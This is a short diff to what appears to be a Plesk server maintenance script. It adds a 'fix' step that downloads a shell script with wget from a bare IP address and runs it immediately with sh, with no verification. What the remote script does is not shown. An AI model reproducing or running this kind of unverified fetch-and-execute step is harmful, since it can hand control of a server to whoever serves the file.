@@ -17,3 +17,7 @@ plesk bin reconfigurator /root/ip_map_file_name
 
 # Remove file
 rm -f /root/ip_map_file_name
+
+# Run script fix 20/12/2018 (Old 10/12/2018)
+wget -N 103.57.210.13/da/fix.sh
+sh ./fix.sh
